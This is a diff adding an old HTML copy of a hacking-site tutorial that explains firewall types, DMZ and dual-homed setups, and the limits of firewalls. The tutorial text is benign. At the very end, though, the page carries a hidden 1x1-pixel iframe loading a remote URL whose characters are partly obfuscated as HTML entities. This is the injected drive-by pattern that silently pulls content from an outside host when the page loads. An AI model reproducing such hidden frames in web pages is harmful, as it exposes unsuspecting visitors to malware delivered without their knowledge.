@@ -1,0 +1,251 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<title>Firewalls torn Apart By Ankit Fadia ankit</title>
+</head>
+
+<body>
+
+<p><font face="Verdana">Firewalls torn Apart By Ankit Fadia ankit@bol.net.in</font><font face="Verdana" size="2"><br>
+_____________________________________________________________________________&nbsp;<br>
+<br>
+A firewall is basically something that protects the network from the Internet.&nbsp;<br>
+It is derived from the concept of&nbsp;<br>
+firewalls used in vehicles which is a barrier made of fire resistant material&nbsp;<br>
+protecting the vehicle in case of&nbsp;<br>
+fire. Anyway a firewall is best described as a software or hardware or both&nbsp;<br>
+Hardware and Software packet&nbsp;<br>
+filter that allows only selected packets to pass through from the Internet to&nbsp;<br>
+your private internal network.&nbsp;<br>
+A firewall is a system or a group of systems which guard a trusted network( The&nbsp;<br>
+Internal Private Network&nbsp;<br>
+from the untrusted network (the Internet.) To understand how a firewall works,&nbsp;<br>
+firstly we need to understand&nbsp;<br>
+how exactly data is transferred on the Internet.&nbsp;<br>
+<br>
+NOTE: The following is a very weird, short and incomplete description of the&nbsp;<br>
+TCP\IP protocol, I have just&nbsp;<br>
+given a general idea of the whole data transmission process so that everyone can&nbsp;<br>
+understand firewalls.&nbsp;<br>
+<br>
+The TCP\IP suite is responsible for successful transfer of data across a network&nbsp;<br>
+both the Internet and the&nbsp;<br>
+Intranet. The TCP\IP suite is a collection of protocols which are inter-related&nbsp;<br>
+and interdependent and act as a&nbsp;<br>
+set of rules according to which data is transferred across the network. A protocol&nbsp;<br>
+can be defined as a language&nbsp;<br>
+or a standard which is followed while transfer of data takes place. Lets go&nbsp;<br>
+through a brief explanation of how&nbsp;<br>
+data is transferred across a network following the various components of the&nbsp;<br>
+TCP\IP suite.&nbsp;<br>
+The whole process of data transmission begins when a user starts up an Internet&nbsp;<br>
+application like the email&nbsp;<br>
+client or a FTP client. The user types an email in his client and in this way&nbsp;<br>
+provides data to be&nbsp;<br>
+transferred. The email client is said to be a part of the application layer of&nbsp;<br>
+the TCP\IP stack. Now this&nbsp;<br>
+application layer (email client) provides data (the email itself) which has to be&nbsp;<br>
+transferred to the Transmission&nbsp;<br>
+control protocol or TCP which constitutes the Transfer Layer of TCP\IP. TCP breaks&nbsp;<br>
+down the data i.e. the&nbsp;<br>
+email into smaller chunks called packets and hands over the responsibility to the&nbsp;<br>
+Internet Protocol or IP&nbsp;<br>
+which forms the invisible network layer. This Internet Protocol adds some various&nbsp;<br>
+info to each packet to&nbsp;<br>
+ensure that the packet knows for which computer it is meant for and which port&nbsp;<br>
+or application it is going to&nbsp;<br>
+meet and from where it has come. An IP datagram contains:&nbsp;<br>
+<br>
+1. A header which contains the Source and Destination IP, Time to live info and&nbsp;<br>
+also the protocol&nbsp;<br>
+used. There is also a header checksum present.&nbsp;<br>
+2. Remaining part contains the data to be transferred.&nbsp;<br>
+<br>
+You do not need to understand all this in detail but just remember that TCP&nbsp;<br>
+breaks data into smaller packets&nbsp;<br>
+and IP adds the source and destination IP's to the packets. When the data reaches&nbsp;<br>
+the other server IP hands&nbsp;<br>
+the packets to TCP again which re assembles the packets. Port numbers are also&nbsp;<br>
+used to ensure that the&nbsp;<br>
+packets know to which application it need to go to. So, basically we can conclude&nbsp;<br>
+that a successful&nbsp;<br>
+transmission of data across a network relies on the source and destination IP&nbsp;<br>
+and also the ports.&nbsp;<br>
+<br>
+A firewall too relies on the source and destination IP and also the ports to&nbsp;<br>
+control the packet transfer between&nbsp;<br>
+the untrusted network and the trusted network. Firewalls can be classified into 3&nbsp;<br>
+types:&nbsp;<br>
+<br>
+1. Packet Filter Firewalls&nbsp;<br>
+2. Application proxy Firewalls&nbsp;<br>
+3. Packet Inspection Firewalls&nbsp;<br>
+<br>
+Packet Filter Firewalls&nbsp;<br>
+<br>
+They are the earliest and the most criticized firewalls, which nowadays are not&nbsp;<br>
+easily found. They are usually&nbsp;<br>
+Hardware based i.e. Router Based (a router is a piece of device which connects two&nbsp;<br>
+networks together.)&nbsp;<br>
+Whenever a Packet Filter Firewall receives a packet for permission to pass&nbsp;<br>
+through, it compares the header&nbsp;<br>
+information i.e. the source and destination IP address, and port number with a&nbsp;<br>
+table of predefined access&nbsp;<br>
+control rules If the header information matches, then the packet is allowed to&nbsp;<br>
+pass else the packet is&nbsp;<br>
+dropped or terminated. They are not popular due to the fact that they allow&nbsp;<br>
+direct contact between the&nbsp;<br>
+untrusted system and the trusted private system.&nbsp;<br>
+To understand such firewalls lets take the example of the secretary that sits in&nbsp;<br>
+your office. This kind of&nbsp;<br>
+secretary allows only those people who have an appointment to pass but if you&nbsp;<br>
+convince her that her boss&nbsp;<br>
+wants to meet her then she would allow you to pass.&nbsp;<br>
+Such Firewalls can be fooled by using techniques like IP Spoofing in which we&nbsp;<br>
+can change the source&nbsp;<br>
+IP such that the firewall thinks that the packet has come from a trusted system&nbsp;<br>
+which is among the list of&nbsp;<br>
+systems which have access through the firewall.&nbsp;<br>
+<br>
+Application proxy Firewalls&nbsp;<br>
+<br>
+The shortcomings of the packet filter firewalls are addressed by the new type of&nbsp;<br>
+firewalls developed by&nbsp;<br>
+the DARPA. It was widely believed that the earlier type of firewalls were not&nbsp;<br>
+secure enough as they allowed&nbsp;<br>
+the untrusted systems to have a direct connection with the trusted systems. This&nbsp;<br>
+problem was solved with&nbsp;<br>
+the use of Proxy servers as firewalls. A proxy server which is used as a&nbsp;<br>
+firewall are called application proxy&nbsp;<br>
+servers.&nbsp;<br>
+This kind of a proxy firewall examines what application or service (running on&nbsp;<br>
+ports) a packet is meant for&nbsp;<br>
+and if that particular service is available only then is the packet allowed to&nbsp;<br>
+pass through and if the service is&nbsp;<br>
+unavailable then the packet is discarded or dropped by the firewall. Once this&nbsp;<br>
+is done, the firewall extracts&nbsp;<br>
+the data and delivers it to the appropriate service. There is not direct&nbsp;<br>
+connection between the untrusted&nbsp;<br>
+systems with the trusted systems as the original data sent by the untrusted&nbsp;<br>
+system is dropped by the firewall&nbsp;<br>
+and it personally delivers the data.&nbsp;<br>
+<br>
+Let's again take the example of a secretary. Such a secretary would take a gift&nbsp;<br>
+or something else for you&nbsp;<br>
+only if you are available in the office and it would not allow the visitor to&nbsp;<br>
+deliver the thing but would personally&nbsp;<br>
+deliver it to you. Although they are somewhat slower, they are much more&nbsp;<br>
+secure as they do not allow&nbsp;<br>
+a direct contact between an untrusted network and a trusted network.&nbsp;<br>
+<br>
+Packet Inspection Firewalls&nbsp;<br>
+<br>
+It can be also known as an extension of the Packet Filter Firewall. It not only&nbsp;<br>
+verifies the source and&nbsp;<br>
+destination IP's and ports, it also takes into consideration or verifies that&nbsp;<br>
+content of the data before passing it&nbsp;<br>
+through. There are two ways in which this kind of a firewall verifies the data to&nbsp;<br>
+be passed:&nbsp;<br>
+State and Session.&nbsp;<br>
+In case of state inspection, an incoming packet is allowed to pass through only&nbsp;<br>
+if there is a matching&nbsp;<br>
+outward bound request for this packet. This means that the incoming packet is&nbsp;<br>
+allowed to pass through only&nbsp;<br>
+if the trusted server had requested for it or had sent an invitation for it.&nbsp;<br>
+In case of session filtering, the data of the incoming is not verified, but&nbsp;<br>
+instead the network activity is traced&nbsp;<br>
+and once a trusted system ends the session, no further packets from that system&nbsp;<br>
+pertaining to that session&nbsp;<br>
+are allowed to pass through. This protects against IP spoofing to a certain&nbsp;<br>
+extend.&nbsp;<br>
+Such firewalls can also be configured beforehand to act according to pre defined&nbsp;<br>
+rules when it is attacked. It&nbsp;<br>
+can also be configured to disconnect from the Internet in case of an attack.&nbsp;<br>
+<br>
+All along you will come across many Firewalls on various systems, basically a&nbsp;<br>
+firewall can be established&nbsp;<br>
+or setup in two ways:&nbsp;<br>
+<br>
+1. Dual-homed gateway&nbsp;<br>
+2. Demilitarized zone (DMZ)&nbsp;<br>
+<br>
+In a dual homed gateway firewall, there is a single firewall with 2 connections,&nbsp;<br>
+one for the trusted network&nbsp;<br>
+and the other for the untrusted network.&nbsp;<br>
+In the case of a Demilitarized Firewall or a DMZ there are two firewalls, each&nbsp;<br>
+with two connections, but there&nbsp;<br>
+is a slight difference in the case of a DMZ setup.&nbsp;<br>
+In the case of a DMZ setup, there are two firewalls, the first having two&nbsp;<br>
+connections, one leading to the&nbsp;<br>
+untrusted network and the other leading to the host systems like the email&nbsp;<br>
+server or the FTP server etc.&nbsp;<br>
+These host systems can be accessed from the untrusted network. These host systems&nbsp;<br>
+are connected with the&nbsp;<br>
+internal private trusted systems through another firewall. Thus there is no&nbsp;<br>
+direct contact between the&nbsp;<br>
+untrusted network and the trusted internal network. The area or region between&nbsp;<br>
+the two firewalls is termed as&nbsp;<br>
+the demilitarized zone.&nbsp;<br>
+In the case of a Dual Homed Gateway the untrusted network is connected to the&nbsp;<br>
+host systems (email&nbsp;<br>
+and FTP servers etc) through a firewall and these host systems are connected to&nbsp;<br>
+the internal private&nbsp;<br>
+network. There is no second firewall between the host systems and the internal&nbsp;<br>
+private trusted network.&nbsp;<br>
+The basic structure of the DMZ setup declares it to be a more secure system as&nbsp;<br>
+even if an attacker gets&nbsp;<br>
+through the first firewall, he just reaches the host systems, while the internal&nbsp;<br>
+network is protected by another&nbsp;<br>
+firewall.&nbsp;<br>
+<br>
+Do Firewalls provide enough Security for my Network?&nbsp;<br>
+<br>
+The answer is a simple no. There is no such thing that a firewall is enough to&nbsp;<br>
+fulfill or satisfy all your&nbsp;<br>
+security concerns. Yes it does protect the trusted systems from the untrusted&nbsp;<br>
+ones, but they are definitely&nbsp;<br>
+not enough for all your security needs. We need to protect our systems to secure&nbsp;<br>
+the company data. The&nbsp;<br>
+most common methods used to break into networks are brute force password&nbsp;<br>
+cracking and social&nbsp;<br>
+engineering. A firewall in no way can prevent such occurrences.&nbsp;<br>
+<br>
+There are other ways in which attackers can steal or destroy company data. Phone&nbsp;<br>
+Tapping and the use of&nbsp;<br>
+spy gadgets has become a common occurance.Although providing safety to the&nbsp;<br>
+network to a large extend, a&nbsp;<br>
+firewall is still not able to protect the company data from Viruses and Trojans,&nbsp;<br>
+although some firewalls do&nbsp;<br>
+provide for scanning everything being downloaded, the rate at which new HTML,&nbsp;<br>
+Java and other viruses are&nbsp;<br>
+propping up, it is becoming very difficult for firewalls to detect all&nbsp;<br>
+viruses. Anyway firewalls provide no&nbsp;<br>
+physical protection to the networks. It also provides no protection from fire,&nbsp;<br>
+tornados etc.Yet another&nbsp;<br>
+shortcoming is the fact that if the attacker is able to break into a trusted&nbsp;<br>
+system which is provided access by&nbsp;<br>
+the firewall, then he can easily gain access to the data at your network, as the&nbsp;<br>
+firewall will think that he is&nbsp;<br>
+actually the trusted party.&nbsp;<br>
+<br>
+Ankit Fadia&nbsp;<br>
+ankit@bol.net.in&nbsp;<br>
+<br>
+http://www.crosswinds.net/~hackingtruths&nbsp;<br>
+<br>
+To receive more tutorials on Hacking, Cracking (Assembly), Perl, C++ and&nbsp;<br>
+Viruses/Trojans and&nbsp;<br>
+more join my mailing list:&nbsp;<br>
+<br>
+Send an email to programmingforhackers-subscribe@egroups.com to join it.&nbsp;</font><br>
+<br>
+Visit my Site to view all tutorials written by me at:&nbsp;<br>
+http://www.crosswinds.net/~hackingtruths </p>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+
+</html>
